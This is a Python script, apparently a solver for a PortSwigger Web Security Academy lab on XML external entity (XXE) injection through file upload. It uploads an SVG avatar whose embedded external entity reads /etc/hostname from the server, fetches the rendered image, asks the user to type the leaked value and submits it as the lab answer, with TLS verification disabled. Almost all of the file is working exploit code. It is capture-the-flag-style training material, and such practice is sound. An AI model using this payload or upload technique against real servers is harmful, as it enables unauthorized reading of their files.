import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep
from bs4 import BeautifulSoup
from io import BytesIO
from PIL import Image

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload
# author: 0xyf


class XXE8:
    def __init__(self):
        self.lab_id = "0ad100bf0441f42d844840f200310036"
        self.proxies = {"https": "http://127.0.0.1:8080"}

        self.url = f"https://{self.lab_id}.web-security-academy.net"
        self.post_id = 1
        self.vuln_url = f"{self.url}/post/comment"
        self.csrf_url = f"{self.url}/post?postId={self.post_id}"

    def get_csrf_token(self):
        r = requests.get(f"{self.csrf_url}")
        soup = BeautifulSoup(r.text, "html.parser")
        self.csrf_token = soup.find("input", attrs={"name": "csrf"})["value"]
        self.cookies = r.cookies

    def get_submit_url(self):
        r = requests.get(self.url)
        soup = BeautifulSoup(r.text, "html.parser")
        submit_path = soup.find("button", id="submitSolution").get("path")
        self.submit_url = f"{self.url}{submit_path}"

    def xxe(self):
        self.get_csrf_token()
        payload = """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><svg xmlns="http://www.w3.org/2000/svg" width="150" height="150"><text x="10" y="20">&xxe;</text></svg>"""
        files = {
            "avatar": ("xxe8.svg", payload),
        }

        print(f"[+] payload: {payload}")

        data = {
            "csrf": self.csrf_token,
            "postId": self.post_id,
            "comment": "Hello World!",
            "name": "0xyf",
            "email": "0xyf@0xyf.local",
            "website": "https://yufongg.github.ioo",
        }

        r = requests.post(
            f"{self.vuln_url}",
            files=files,
            data=data,
            proxies=self.proxies,
            cookies=self.cookies,
            verify=False,
        )

    def get_image_url(self):
        r = requests.get(f"{self.csrf_url}")
        soup = BeautifulSoup(r.text, "html.parser")
        image_url = soup.find_all("img", class_="avatar")[-1]["src"]
        self.image_url = f"{self.url}{image_url}"

    def open_image(self):
        self.get_image_url()
        img = requests.get(self.image_url)
        img = Image.open(BytesIO(img.content)).show()
        self.value = input("Enter what you see: ")

    def submit_value(self):
        self.get_submit_url()
        print(f"[+] submitting value: {self.value}")
        data = {"answer": self.value}
        r = requests.post(
            self.submit_url,
            data=data,
            proxies=self.proxies,
            verify=False,
        )

    def check_solved(self):
        sleep(5)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def solve(self):
        self.xxe()
        self.open_image()
        self.submit_value()
        self.check_solved()


def main():
    XXE8().solve()


if __name__ == "__main__":
    main()
